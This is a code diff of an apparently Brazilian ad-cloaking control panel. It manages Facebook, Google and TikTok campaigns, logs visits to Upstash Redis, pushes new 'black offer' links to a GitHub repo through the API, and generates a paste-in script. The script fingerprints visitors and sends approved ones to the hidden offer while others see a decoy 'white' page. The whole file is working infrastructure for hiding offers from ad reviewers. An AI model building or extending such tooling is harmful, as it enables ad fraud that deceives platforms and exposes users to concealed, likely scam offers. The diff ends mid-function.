-                <button type="button" class="btn btn-outline" onclick="clearLogs()" id="btnClearLogs">Limpar logs</button>
-                <span id="logs-count" style="color: var(--text-secondary); font-size: 0.875rem; margin-left: auto;"></span>
+            <div style="margin-bottom:0.75rem;">
+                <span id="logs-count" style="color:var(--text-secondary);font-size:0.85rem;"></span>
             </div>
 
-            <!-- Tabela -->
             <div class="logs-table-wrapper">
                 <table class="logs-table">
                     <thead>
                         <tr>
                             <th>Data/Hora</th>
+                            <th>Campanha</th>
                             <th>Dispositivo</th>
                             <th>IP</th>
                             <th>Ação</th>
@@ -627,500 +559,539 @@
                         </tr>
                     </thead>
                     <tbody id="logs-tbody">
-                        <tr><td colspan="6" class="logs-empty">Clique em "Atualizar logs" para carregar.</td></tr>
+                        <tr><td colspan="7" class="logs-empty">Clique em "Atualizar" para carregar.</td></tr>
                     </tbody>
                 </table>
             </div>
         </div>
+
+        <!-- ══════════════ CONFIGURAÇÕES ══════════════ -->
+        <div id="tab-config" class="tab-content">
+            <h2>Configurações</h2>
+            <div id="config-msg" class="alert"></div>
+
+            <!-- Upstash -->
+            <div class="config-section">
+                <div class="config-section-title">Upstash Redis — Logs</div>
+                <div class="form-group">
+                    <label>URL do Redis</label>
+                    <input type="url" id="upstash-url" placeholder="https://humane-ibex-137301.upstash.io">
+                </div>
+                <div class="form-group">
+                    <label>Token</label>
+                    <input type="password" id="upstash-token" placeholder="Token do Upstash">
+                </div>
+                <button class="btn" onclick="saveUpstashConfig()">Salvar Upstash</button>
+            </div>
+
+            <!-- Vercel + GitHub -->
+            <form onsubmit="saveConfig(event)">
+                <div class="config-section">
+                    <div class="config-section-title">Vercel &amp; GitHub</div>
+                    <div class="form-group">
+                        <label>URL Base da Vercel</label>
+                        <input type="url" id="vercel-url" placeholder="https://meu-cloaker.vercel.app">
+                    </div>
+                    <div class="form-group">
+                        <label>GitHub Personal Access Token</label>
+                        <input type="password" id="gh-token" placeholder="ghp_xxxxxxxxxxxxxxxxxxxx">
+                    </div>
+                    <div class="form-group">
+                        <label>Repositório</label>
+                        <input type="text" id="gh-repo" placeholder="usuario/repositorio">
+                    </div>
+                    <div class="form-group">
+                        <label>Branch</label>
+                        <input type="text" id="gh-branch" value="main">
+                    </div>
+                    <div class="form-group">
+                        <label>Caminho do arquivo</label>
+                        <input type="text" id="gh-path" value="api/filtrar.mjs">
+                    </div>
+                    <button type="submit" class="btn">Salvar Configurações</button>
+                </div>
+            </form>
+        </div>
+
     </main>
 </div>
 
+<!-- ══════════════ MODAL: Script ══════════════ -->
+<div id="modal-overlay" class="modal-overlay" style="display:none;" onclick="closeModal(event)">
+    <div class="modal">
+        <div class="modal-header">
+            <div>
+                <div style="font-size:0.72rem;text-transform:uppercase;letter-spacing:0.05em;color:var(--text-secondary);margin-bottom:0.3rem;">Script para</div>
+                <div id="modal-campaign-name" style="font-size:1.05rem;font-weight:600;"></div>
+            </div>
+            <div style="display:flex;gap:0.6rem;align-items:center;">
+                <button class="btn btn-outline" style="font-size:0.82rem;padding:0.5rem 1rem;" id="btn-copy-modal" onclick="copyModalScript()">Copiar Script</button>
+                <button class="btn-icon" onclick="closeModalBtn()" title="Fechar" style="font-size:1rem;">✕</button>
+            </div>
+        </div>
+        <p style="color:var(--text-secondary);font-size:0.83rem;margin-bottom:1rem;">Cole no <code>&lt;head&gt;</code> ou final do <code>&lt;body&gt;</code> do site.</p>
+        <div class="code-block" style="max-height:360px;overflow-y:auto;">
+            <pre id="modal-script-output"></pre>
+        </div>
+    </div>
+</div>
+
 <script>
-    // ---- Logs / Upstash ----
-    window.addEventListener('DOMContentLoaded', () => {
-        document.getElementById('upstash-url').value   = localStorage.getItem('upstash_url')   || '';
-        document.getElementById('upstash-token').value = localStorage.getItem('upstash_token') || '';
+// ════════════════════════════════════════════════════════════
+//  Utilitários
+// ════════════════════════════════════════════════════════════
+function escHtml(s) {
+    return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+function escJs(s) {
+    return String(s || '').replace(/\\/g,'\\\\').replace(/"/g,'\\"').replace(/\n/g,'\\n');
+}
+function showMessage(id, msg, type) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.className = `alert ${type}`;
+    el.innerHTML = msg;
+    el.style.display = 'flex';
+}
+function hideAllMessages() {
+    document.querySelectorAll('.alert').forEach(el => el.style.display = 'none');
+}
+
+// ════════════════════════════════════════════════════════════
+//  Campanhas — localStorage
+// ════════════════════════════════════════════════════════════
+function getCampaigns() {
+    try { return JSON.parse(localStorage.getItem('cloaker_campaigns') || '[]'); } catch { return []; }
+}
+function saveCampaigns(arr) {
+    localStorage.setItem('cloaker_campaigns', JSON.stringify(arr));
+}
+function genId() {
+    return 'camp_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6);
+}
+function platformLabel(p) {
+    return { facebook: '📘 Facebook', google: '🔍 Google', tiktok: '🎵 TikTok' }[p] || p;
+}
+
+// ════════════════════════════════════════════════════════════
+//  Home
+// ════════════════════════════════════════════════════════════
+async function loadHome() {
+    const grid = document.getElementById('campaigns-grid');
+    const campaigns = getCampaigns();
+    hideAllMessages();
+
+    if (!campaigns.length) {
+        grid.innerHTML = `<div class="empty-state">
+            <div style="font-size:3.5rem;margin-bottom:1rem">🎯</div>
+            <h3>Nenhuma campanha ainda</h3>
+            <p>Crie sua primeira campanha para começar a usar o cloaker.</p>
+            <button class="btn" onclick="newCampaign()">+ Nova Campanha</button>
+        </div>`;
+        return;
+    }
+
+    // Skeleton enquanto carrega stats
+    grid.innerHTML = campaigns.map(c => renderCard(c, null)).join('');
+
+    let logs = [];
+    try {
+        logs = await fetchAllLogs(500);
+    } catch (e) {
+        showMessage('home-msg', 'Erro ao carregar stats: ' + e.message, 'error');
+    }
+
+    const normLogs = logs.map(normLog);
+    grid.innerHTML = campaigns.map(c => {
+        const cl       = normLogs.filter(l => l.cid === c.id);
+        const total    = cl.length;
+        const approved = cl.filter(l => l.ac === 'approved').length;
+        const blocked  = total - approved;
+        const rate     = total > 0 ? Math.round(approved / total * 100) : 0;
+        return renderCard(c, { total, approved, blocked, rate });
+    }).join('');
+}
+
+function renderCard(camp, stats) {
+    const miniStats = stats === null
+        ? `<div class="campaign-mini-stats" style="opacity:0.35">
+            <div class="mini-stat"><div class="mini-stat-val">—</div><div class="mini-stat-lbl">Total</div></div>
+            <div class="mini-stat blue"><div class="mini-stat-val">—</div><div class="mini-stat-lbl">Taxa</div></div>
+            <div class="mini-stat green"><div class="mini-stat-val">—</div><div class="mini-stat-lbl">Aprovados</div></div>
+            <div class="mini-stat red"><div class="mini-stat-val">—</div><div class="mini-stat-lbl">Bloqueados</div></div>
+          </div>`
+        : `<div class="campaign-mini-stats">
+            <div class="mini-stat"><div class="mini-stat-val">${stats.total}</div><div class="mini-stat-lbl">Total</div></div>
+            <div class="mini-stat blue"><div class="mini-stat-val">${stats.rate}%</div><div class="mini-stat-lbl">Taxa</div></div>
+            <div class="mini-stat green"><div class="mini-stat-val">${stats.approved}</div><div class="mini-stat-lbl">Aprovados</div></div>
+            <div class="mini-stat red"><div class="mini-stat-val">${stats.blocked}</div><div class="mini-stat-lbl">Bloqueados</div></div>
+          </div>`;
+
+    return `<div class="campaign-card">
+        <div class="campaign-card-header">
+            <div style="min-width:0;">
+                <div class="campaign-name">${escHtml(camp.name)}</div>
+                <span class="platform-badge ${escHtml(camp.platform)}">${platformLabel(camp.platform)}</span>
+            </div>
+            <div class="campaign-card-menu">
+                <button class="btn-icon" onclick="editCampaign('${escHtml(camp.id)}')" title="Editar">✏️</button>
+                <button class="btn-icon danger" onclick="deleteCampaign('${escHtml(camp.id)}')" title="Excluir">🗑️</button>
+            </div>
+        </div>
+        ${miniStats}
+        <div class="campaign-black-url" title="${escHtml(camp.ofertaBlack)}">🔗 ${escHtml(camp.ofertaBlack || '—')}</div>
+        <button class="btn btn-outline" style="width:100%;font-size:0.82rem;padding:0.6rem;" onclick="showScript('${escHtml(camp.id)}')">📋 Ver Script de Integração</button>
+    </div>`;
+}
+
+function deleteCampaign(id) {
+    if (!confirm('Excluir esta campanha? Os logs não serão apagados.')) return;
+    saveCampaigns(getCampaigns().filter(c => c.id !== id));
+    loadHome();
+}
+
+// ════════════════════════════════════════════════════════════
+//  Formulário de Campanha
+// ════════════════════════════════════════════════════════════
+function newCampaign() {
+    activateTab('campaign');
+    document.getElementById('campaign-id').value = '';
+    document.getElementById('campaign-form-title').textContent = 'Nova Campanha';
+    document.getElementById('campaign-name-input').value  = '';
+    document.getElementById('campaign-black-input').value = '';
+    document.getElementById('campaign-white-input').value = '';
+    document.querySelectorAll('.platform-option').forEach(o => o.classList.remove('selected'));
+    document.querySelectorAll('input[name="platform"]').forEach(r => r.checked = false);
+    document.getElementById('campaign-script-section').style.display = 'none';
+    hideAllMessages();
+}
+
+function editCampaign(id) {
+    const camp = getCampaigns().find(c => c.id === id);
+    if (!camp) return;
+    activateTab('campaign');
+    document.getElementById('campaign-id').value = camp.id;
+    document.getElementById('campaign-form-title').textContent = 'Editar Campanha';
+    document.getElementById('campaign-name-input').value  = camp.name        || '';
+    document.getElementById('campaign-black-input').value = camp.ofertaBlack || '';
+    document.getElementById('campaign-white-input').value = camp.whiteUrl    || '';
+    selectPlatform(camp.platform);
+    refreshCampaignScript(camp);
+    document.getElementById('campaign-script-section').style.display = 'block';
+    hideAllMessages();
+}
+
+function selectPlatform(value) {
+    document.querySelectorAll('.platform-option').forEach(o => {
+        const r = o.querySelector('input[type="radio"]');
+        const sel = r.value === value;
+        r.checked = sel;
+        o.classList.toggle('selected', sel);
     });
+}
 
-    function saveUpstashConfig() {
-        const url   = document.getElementById('upstash-url').value.trim().replace(/\/$/, '');
-        const token = document.getElementById('upstash-token').value.trim();
-        if (!url || !token) {
-            showMessage('logs-msg', 'Preencha a URL e o Token do Upstash.', 'error');
-            return;
-        }
-        localStorage.setItem('upstash_url',   url);
-        localStorage.setItem('upstash_token', token);
-        showMessage('logs-msg', 'Credenciais salvas!', 'success');
-        setTimeout(() => hideAllMessages(), 3000);
+function saveCampaign() {
+    const id          = document.getElementById('campaign-id').value;
+    const name        = document.getElementById('campaign-name-input').value.trim();
+    const ofertaBlack = document.getElementById('campaign-black-input').value.trim();
+    const whiteUrl    = document.getElementById('campaign-white-input').value.trim();
+    const platform    = document.querySelector('input[name="platform"]:checked')?.value || '';
+
+    if (!name)        { showMessage('campaign-msg', 'Digite o nome da campanha.', 'error');    return; }
+    if (!platform)    { showMessage('campaign-msg', 'Selecione a plataforma.',    'error');    return; }
+    if (!ofertaBlack) { showMessage('campaign-msg', 'Digite o link da oferta.',   'error');    return; }
+
+    const campaigns = getCampaigns();
+    let camp;
+    if (id) {
+        const idx = campaigns.findIndex(c => c.id === id);
+        if (idx >= 0) { campaigns[idx] = { ...campaigns[idx], name, platform, ofertaBlack, whiteUrl }; camp = campaigns[idx]; }
     }
-
-    function getUpstashCreds() {
-        const url   = localStorage.getItem('upstash_url');
-        const token = localStorage.getItem('upstash_token');
-        if (!url || !token) throw new Error('Configure e salve as credenciais do Upstash primeiro.');
-        return { url, token };
+    if (!camp) {
+        camp = { id: genId(), name, platform, ofertaBlack, whiteUrl, createdAt: new Date().toISOString() };
+        campaigns.push(camp);
     }
+    saveCampaigns(campaigns);
 
-    async function fetchLogs() {
-        const btn = document.getElementById('btnFetchLogs');
-        btn.disabled = true;
-        btn.textContent = 'Carregando...';
-        hideAllMessages();
-        try {
-            const { url, token } = getUpstashCreds();
-            const res = await fetch(`${url}/lrange/cloaker_logs/0/99`, {
-                headers: { Authorization: `Bearer ${token}` }
-            });
-            if (!res.ok) throw new Error(`Erro HTTP ${res.status} ao buscar logs.`);
-            const data = await res.json();
-            const logs = (data.result || []).map(entry => {
-                try {
-                    const parsed = JSON.parse(entry);
-                    // Versões antigas faziam double-stringify
-                    return typeof parsed === 'string' ? JSON.parse(parsed) : parsed;
-                } catch { return null; }
-            }).filter(Boolean);
-            renderLogs(logs);
-            document.getElementById('logs-count').textContent = `${logs.length} registro(s)`;
-        } catch (e) {
-            showMessage('logs-msg', e.message, 'error');
-        } finally {
-            btn.disabled = false;
-            btn.textContent = '↻ Atualizar logs';
-        }
-    }
+    document.getElementById('campaign-id').value = camp.id;
+    document.getElementById('campaign-form-title').textContent = 'Editar Campanha';
+    refreshCampaignScript(camp);
+    document.getElementById('campaign-script-section').style.display = 'block';
+    showMessage('campaign-msg', '✓ Campanha salva! Script pronto abaixo.', 'success');
+    setTimeout(() => hideAllMessages(), 4000);
+}
 
-    function renderLogs(logs) {
-        const tbody = document.getElementById('logs-tbody');
-        if (!logs.length) {
-            tbody.innerHTML = '<tr><td colspan="6" class="logs-empty">Nenhum log encontrado.</td></tr>';
-            return;
-        }
-        tbody.innerHTML = logs.map(log => {
-            // Suporte a nomes de campo antigos (timestamp/device/action/reason/destination)
-            // e novos (t/dv/ac/rs/dst)
-            const ts  = log.t  || log.timestamp  || '';
-            const dv  = log.dv || log.device     || 'desktop';
-            const ac  = log.ac || (log.action === 'redirect' ? 'approved' : (log.action === 'allow_white' ? 'blocked' : log.action)) || 'blocked';
-            const rs  = log.rs || log.reason     || '—';
-            const dst = log.dst || log.destination || '';
+function refreshCampaignScript(camp) {
+    document.getElementById('campaign-script-output').textContent = buildScript(camp);
+}
 
-            const dt = ts
-                ? new Date(ts).toLocaleString('pt-BR', { dateStyle: 'short', timeStyle: 'medium' })
-                : '—';
-            const deviceIcon = dv === 'mobile' ? '📱 mobile' : '🖥️ desktop';
-            const badge = ac === 'approved'
-                ? '<span class="badge badge-green">✔ approved</span>'
-                : '<span class="badge badge-red">✖ blocked</span>';
-            const dest = dst && dst !== 'blocked'
-                ? `<span class="destination-cell" title="${dst}">${dst}</span>`
-                : '<span style="color:var(--text-secondary)">—</span>';
-            return `<tr>
-                <td>${dt}</td>
-                <td>${deviceIcon}</td>
-                <td>${log.ip || '—'}</td>
-                <td>${badge}</td>
-                <td>${rs}</td>
-                <td>${dest}</td>
-            </tr>`;
-        }).join('');
-    }
-
-    async function clearLogs() {
-        if (!confirm('Tem certeza que deseja apagar todos os logs?')) return;
-        const btn = document.getElementById('btnClearLogs');
-        btn.disabled = true;
-        hideAllMessages();
-        try {
-            const { url, token } = getUpstashCreds();
-            const res = await fetch(`${url}/del/cloaker_logs`, {
-                method: 'POST',
-                headers: { Authorization: `Bearer ${token}` }
-            });
-            if (!res.ok) throw new Error(`Erro HTTP ${res.status} ao limpar logs.`);
-            document.getElementById('logs-tbody').innerHTML =
-                '<tr><td colspan="6" class="logs-empty">Logs apagados com sucesso.</td></tr>';
-            document.getElementById('logs-count').textContent = '0 registro(s)';
-            showMessage('logs-msg', 'Logs apagados!', 'success');
-            setTimeout(() => hideAllMessages(), 3000);
-        } catch (e) {
-            showMessage('logs-msg', e.message, 'error');
-        } finally {
-            btn.disabled = false;
-        }
-    }
-    // ---- fim Logs ----
-
-    // ==================== OVERVIEW ====================
-    async function loadOverview() {
-        const btn = document.getElementById('btnRefreshOverview');
-        if (btn) { btn.disabled = true; btn.textContent = 'Carregando...'; }
-        hideAllMessages();
-        try {
-            const { url, token } = getUpstashCreds();
-            const res = await fetch(`${url}/lrange/cloaker_logs/0/499`, {
-                headers: { Authorization: `Bearer ${token}` }
-            });
-            if (!res.ok) throw new Error(`Upstash retornou ${res.status}`);
-            const data = await res.json();
-
-            const logs = (data.result || []).map(entry => {
-                try {
-                    const p = JSON.parse(entry);
-                    const obj = typeof p === 'string' ? JSON.parse(p) : p;
-                    if (!obj || typeof obj !== 'object') return null;
-                    const ac_raw = obj.ac || obj.action || '';
-                    return {
-                        ac: (ac_raw === 'approved' || ac_raw === 'redirect') ? 'approved' : 'blocked',
-                        dv: obj.dv || obj.device || 'desktop',
-                        rs: obj.rs || obj.reason || 'Desconhecido',
-                    };
-                } catch { return null; }
-            }).filter(Boolean);
-
-            const total    = logs.length;
-            const approved = logs.filter(l => l.ac === 'approved').length;
-            const blocked  = total - approved;
-            const rate     = total > 0 ? Math.round(approved / total * 100) : 0;
-
-            document.getElementById('ov-total').textContent    = total;
-            document.getElementById('ov-approved').textContent = approved;
-            document.getElementById('ov-blocked').textContent  = blocked;
-            document.getElementById('ov-rate').textContent     = rate + '%';
-            document.getElementById('ov-rate-sub').textContent = `${approved} aprovado(s) de ${total}`;
-
-            // Motivos de bloqueio
-            const reasonCount = {};
-            logs.filter(l => l.ac !== 'approved').forEach(l => {
-                reasonCount[l.rs] = (reasonCount[l.rs] || 0) + 1;
-            });
-            const reasonsEl = document.getElementById('ov-reasons');
-            if (blocked === 0) {
-                reasonsEl.innerHTML = '<p style="color:var(--text-secondary);font-size:0.875rem">Nenhum bloqueio nos registros.</p>';
-            } else {
-                const entries = Object.entries(reasonCount).sort((a, b) => b[1] - a[1]);
-                const maxR = entries[0][1];
-                reasonsEl.innerHTML = entries.map(([label, count]) => `
-                    <div class="bar-row">
-                        <div class="bar-label" title="${escHtml(label)}">${escHtml(label)}</div>
-                        <div class="bar-track"><div class="bar-fill" style="width:${Math.round(count/maxR*100)}%;background:#f87171;opacity:0.8;"></div></div>
-                        <div class="bar-count">${count}</div>
-                    </div>`).join('');
-            }
-
-            // Dispositivos
-            const mobile  = logs.filter(l => l.dv === 'mobile').length;
-            const desktop = total - mobile;
-            const maxD    = Math.max(mobile, desktop, 1);
-            document.getElementById('ov-devices').innerHTML = `
-                <div class="bar-row">
-                    <div class="bar-label">📱 Mobile</div>
-                    <div class="bar-track"><div class="bar-fill" style="width:${Math.round(mobile/maxD*100)}%;background:#34d399;opacity:0.85;"></div></div>
-                    <div class="bar-count">${mobile}</div>
-                </div>
-                <div class="bar-row">
-                    <div class="bar-label">🖥️ Desktop / Bot</div>
-                    <div class="bar-track"><div class="bar-fill" style="width:${Math.round(desktop/maxD*100)}%;background:#f87171;opacity:0.75;"></div></div>
-                    <div class="bar-count">${desktop}</div>
-                </div>`;
-
-        } catch (e) {
-            const el = document.getElementById('overview-msg');
-            if (el) showMessage('overview-msg', e.message, 'error');
-        } finally {
-            if (btn) { btn.disabled = false; btn.textContent = '↻ Atualizar'; }
-        }
-    }
-
-    function escHtml(s) {
-        return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-    }
-    // ==================== fim Overview ====================
-
-    let fileSha = null;
-    let fileContentDecoded = null;
-
-    window.addEventListener('DOMContentLoaded', () => {
-        document.getElementById('gh-token').value  = localStorage.getItem('gh_token')  || '';
-        document.getElementById('gh-repo').value   = localStorage.getItem('gh_repo')   || '';
-        document.getElementById('gh-branch').value = localStorage.getItem('gh_branch') || 'main';
-        document.getElementById('gh-path').value   = localStorage.getItem('gh_path')   || 'api/filtrar.mjs';
-        document.getElementById('vercel-url').value= localStorage.getItem('vercel_url')|| '';
-        // Carrega overview automaticamente se credenciais já estiverem salvas
-        if (localStorage.getItem('upstash_url') && localStorage.getItem('upstash_token')) {
-            loadOverview();
-        }
+function copyCampaignScript() {
+    const code = document.getElementById('campaign-script-output').textContent;
+    navigator.clipboard.writeText(code).then(() => {
+        showMessage('campaign-msg', '✓ Script copiado!', 'success');
+        setTimeout(() => hideAllMessages(), 2500);
     });
+}
 
-    function switchTab(tabId) {
-        document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
-        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
-        
-        document.querySelector(`.nav-item[onclick="switchTab('${tabId}')"]`).classList.add('active');
-        document.getElementById(`tab-${tabId}`).classList.add('active');
-        
-        hideAllMessages();
+// ════════════════════════════════════════════════════════════
+//  Script de integração (gerado por campanha)
+// ════════════════════════════════════════════════════════════
+function buildScript(camp) {
+    const vercelUrl = (localStorage.getItem('vercel_url') || '').replace(/\/$/, '');
+    const ghPath    = (localStorage.getItem('gh_path')    || 'api/filtrar.mjs').replace(/\.mjs$/, '');
 
-        if (tabId === 'script')   generateScript();
-        if (tabId === 'overview') loadOverview();
-    }
+    if (!vercelUrl) return '// Configure a URL da Vercel na aba Configurações primeiro.';
 
-    function showMessage(id, message, type) {
-        const el = document.getElementById(id);
-        el.className = `alert ${type}`;
-        el.innerHTML = message;
-        el.style.display = 'flex';
-    }
+    const ep    = escJs(vercelUrl + '/' + ghPath);
+    const black = escJs(camp.ofertaBlack || '');
+    const white = escJs(camp.whiteUrl    || '');
+    const cid   = escJs(camp.id);
+    const plt   = escJs(camp.platform);
 
-    function hideAllMessages() {
-        document.querySelectorAll('.alert').forEach(el => el.style.display = 'none');
-    }
-
-    function updateDeployStatus(msg, isError = false) {
-        const el = document.getElementById('deployStatus');
-        el.textContent = msg;
-        el.style.color = isError ? 'var(--error-color)' : 'var(--text-secondary)';
-    }
-
-    function saveConfig(e) {
-        e.preventDefault();
-        const token     = document.getElementById('gh-token').value.trim();
-        const repo      = document.getElementById('gh-repo').value.trim();
-        const branch    = document.getElementById('gh-branch').value.trim() || 'main';
-        const path      = document.getElementById('gh-path').value.trim() || 'api/filtrar.mjs';
-        const vercelUrl = document.getElementById('vercel-url').value.trim().replace(/\/$/, '');
-
-        if (!token || !repo) {
-            showMessage('config-msg', 'Preencha ao menos o Token e o Repositório.', 'error');
-            return;
-        }
-
-        localStorage.setItem('gh_token',   token);
-        localStorage.setItem('gh_repo',    repo);
-        localStorage.setItem('gh_branch',  branch);
-        localStorage.setItem('gh_path',    path);
-        localStorage.setItem('vercel_url', vercelUrl);
-
-        showMessage('config-msg', 'Configurações salvas no localStorage!', 'success');
-        setTimeout(() => hideAllMessages(), 3000);
-    }
-
-    function getApiHeaders() {
-        const token = localStorage.getItem('gh_token');
-        if (!token) throw new Error('GitHub Token não configurado.');
-        
-        return {
-            'Authorization': `Bearer ${token}`,
-            'Accept': 'application/vnd.github+json',
-            'X-GitHub-Api-Version': '2022-11-28',
-            'Content-Type': 'application/json'
-        };
-    }
-
-    function getApiUrl() {
-        const repo = localStorage.getItem('gh_repo');
-        const path = localStorage.getItem('gh_path');
-        if (!repo || !path) throw new Error('Repositório ou Caminho não configurados.');
-        return `https://api.github.com/repos/${repo}/contents/${path}`;
-    }
-
-    // Funções de base64 solicitadas para manter codificação original
-    function decodeBase64(b64) {
-        return decodeURIComponent(escape(atob(b64)));
-    }
-
-    function encodeBase64(str) {
-        return btoa(unescape(encodeURIComponent(str)));
-    }
-
-    async function readCurrentFile() {
-        hideAllMessages();
-        const btn = document.getElementById('btnRead');
-        const prevText = btn.textContent;
-        btn.textContent = 'Buscando...';
-        btn.disabled = true;
-        updateDeployStatus('');
-
-        try {
-            const branch = localStorage.getItem('gh_branch') || 'main';
-            const url = `${getApiUrl()}?ref=${branch}`;
-            
-            const res = await fetch(url, { headers: getApiHeaders() });
-            
-            if (!res.ok) {
-                const errData = await res.json().catch(()=>({}));
-                throw new Error(errData.message || `Erro HTTP: ${res.status}`);
-            }
-
-            const data = await res.json();
-            fileSha = data.sha;
-            fileContentDecoded = decodeBase64(data.content);
-            
-            // Regex que captura ofertaBlack ou jsofertaBlack com aspas simples ou duplas
-            const regex = /(ofertaBlack:\s*['"])([^'"]+)(['"])/;
-            const match = fileContentDecoded.match(regex);
-            
-            if (match && match[2]) {
-                const currentLink = match[2];
-                document.getElementById('currentLinkValue').textContent = currentLink;
-                showMessage('mobile-msg', 'Arquivo lido com sucesso!', 'success');
-            } else {
-                document.getElementById('currentLinkValue').textContent = 'Não encontrado no arquivo.';
-                throw new Error("A variável 'ofertaBlack' não foi encontrada usando a regex esperada.");
-            }
-
-        } catch (error) {
-            console.error(error);
-            showMessage('mobile-msg', error.message, 'error');
-        } finally {
-            btn.textContent = prevText;
-            btn.disabled = false;
-        }
-    }
-
-    async function saveAndDeploy() {
-        let novoLink = document.getElementById('newMobileLink').value.trim();
-        if (!novoLink) {
-            showMessage('mobile-msg', 'Por favor, digite o novo link.', 'error');
-            return;
-        }
-
-        if (!/^https?:\/\//i.test(novoLink)) {
-            novoLink = 'https://' + novoLink;
-            document.getElementById('newMobileLink').value = novoLink;
-        }
-
-        const btn = document.getElementById('btnDeploy');
-        btn.disabled = true;
-        hideAllMessages();
-        
-        try {
-            updateDeployStatus('Buscando arquivo atualizado...');
-            
-            const branch = localStorage.getItem('gh_branch') || 'main';
-            const url = getApiUrl();
-            
-            // Fetch mais recente para evitar conflito de SHA
-            const resGet = await fetch(`${url}?ref=${branch}`, { headers: getApiHeaders() });
-            if (!resGet.ok) throw new Error('Falha ao ler o arquivo no repositório.');
-            const dataGet = await resGet.json();
-            
-            fileSha = dataGet.sha;
-            fileContentDecoded = decodeBase64(dataGet.content);
-
-            updateDeployStatus('Fazendo commit...');
-            
-            const regex = /(ofertaBlack:\s*['"])([^'"]+)(['"])/;
-            if (!regex.test(fileContentDecoded)) {
-                throw new Error('A variável "ofertaBlack" não pôde ser localizada no código atual.');
-            }
-
-            const newContent = fileContentDecoded.replace(regex, `$1${novoLink}$3`);
-            const newContentBase64 = encodeBase64(newContent);
-            
-            const putBody = {
-                message: `Update ofertaBlack to ${novoLink}`,
-                content: newContentBase64,
-                sha: fileSha,
-                branch: branch
-            };
-
-            const resPut = await fetch(url, {
-                method: 'PUT',
-                headers: getApiHeaders(),
-                body: JSON.stringify(putBody)
-            });
-
-            if (!resPut.ok) {
-                const errData = await resPut.json().catch(()=>({}));
-                throw new Error(errData.message || `Erro HTTP: ${resPut.status} ao salvar.`);
-            }
-
-            document.getElementById('currentLinkValue').textContent = novoLink;
-            document.getElementById('newMobileLink').value = '';
-            
-            showMessage('mobile-msg', 'Atualizado com sucesso!', 'success');
-            updateDeployStatus('Deploy iniciado! Aguarde ~30s para refletir online.');
-            
-        } catch (error) {
-            console.error(error);
-            showMessage('mobile-msg', error.message, 'error');
-            updateDeployStatus('Falha na atualização.', true);
-        } finally {
-            btn.disabled = false;
-        }
-    }
-
-    function generateScript() {
-        const vercelUrl = (localStorage.getItem('vercel_url') || '').replace(/\/$/, '');
-        const ghPath    = (localStorage.getItem('gh_path') || 'api/filtrar.mjs').replace(/\.mjs$/, '');
-        const endpoint  = vercelUrl + '/' + ghPath;
-
-        if (!vercelUrl) {
-            document.getElementById('scriptOutput').textContent = '// Preencha e salve a URL da Vercel e o Caminho na aba "Configuração".';
-            return;
-        }
-
-        const whiteUrl = document.getElementById('whiteUrl').value.trim();
-
-        const scriptStr = `<script>
-(function() {
-  const endpoint = "${endpoint}";
-  const whiteUrl = "${whiteUrl}";
-  
-  fetch(endpoint, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      screenWidth: window.screen.width,
-      referrer: document.referrer
+    return `<script>
+(function(){
+  fetch("${ep}",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      userAgent:navigator.userAgent,
+      language:navigator.language,
+      screenWidth:window.screen.width,
+      referrer:document.referrer,
+      campaignId:"${cid}",
+      platform:"${plt}",
+      blackUrl:"${black}"
     })
-  })
-  .then(res => res.json())
-  .then(data => {
-    if (data.action === 'redirect' && data.url) {
-      let url = data.url;
-      if (!/^https?:\\/\\//i.test(url)) {
-        url = 'https://' + url;
-      }
-      window.location.href = url;
-    } else if (whiteUrl) {
-      window.location.href = whiteUrl;
-    }
-  })
-  .catch(err => console.error('Cloak Error:', err));
+  }).then(function(r){return r.json();})
+  .then(function(d){
+    if(d.action==="redirect"&&d.url){
+      var u=d.url;if(!/^https?:\\/\\//i.test(u))u="https://"+u;
+      window.location.href=u;
+    }else if("${white}"){window.location.href="${white}";}
+  }).catch(function(e){console.error("Cloak:",e);});
 })();
 <\/script>`;
+}
 
-        document.getElementById('scriptOutput').textContent = scriptStr;
+// ════════════════════════════════════════════════════════════
+//  Modal script
+// ════════════════════════════════════════════════════════════
+function showScript(id) {
+    const camp = getCampaigns().find(c => c.id === id);
+    if (!camp) return;
+    document.getElementById('modal-campaign-name').textContent = camp.name;
+    document.getElementById('modal-script-output').textContent = buildScript(camp);
+    document.getElementById('btn-copy-modal').textContent = 'Copiar Script';
+    document.getElementById('modal-overlay').style.display = 'flex';
+}
+function closeModal(e) { if (e.target === document.getElementById('modal-overlay')) closeModalBtn(); }
+function closeModalBtn() { document.getElementById('modal-overlay').style.display = 'none'; }
+function copyModalScript() {
+    const code = document.getElementById('modal-script-output').textContent;
+    navigator.clipboard.writeText(code).then(() => {
+        const btn = document.getElementById('btn-copy-modal');
+        btn.textContent = '✓ Copiado!';
+        setTimeout(() => { btn.textContent = 'Copiar Script'; }, 2200);
+    });
+}
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModalBtn(); });
+
+// ════════════════════════════════════════════════════════════
+//  Upstash helpers
+// ════════════════════════════════════════════════════════════
+function getUpstashCreds() {
+    const url   = localStorage.getItem('upstash_url');
+    const token = localStorage.getItem('upstash_token');
+    if (!url || !token) throw new Error('Configure e salve as credenciais do Upstash primeiro.');
+    return { url, token };
+}
+
+async function fetchAllLogs(limit) {
+    const { url, token } = getUpstashCreds();
+    const res = await fetch(`${url}/lrange/cloaker_logs/0/${limit - 1}`, {
+        headers: { Authorization: `Bearer ${token}` }
+    });
+    if (!res.ok) throw new Error(`Upstash erro ${res.status}`);
+    const data = await res.json();
+    return (data.result || []).map(entry => {
+        try { const p = JSON.parse(entry); return typeof p === 'string' ? JSON.parse(p) : p; }
+        catch { return null; }
+    }).filter(Boolean);
+}
+
+function normLog(log) {
+    const ts  = log.t  || log.timestamp  || '';
+    const dv  = log.dv || log.device     || 'desktop';
+    const acr = log.ac || log.action     || '';
+    const ac  = (acr === 'approved' || acr === 'redirect') ? 'approved' : 'blocked';
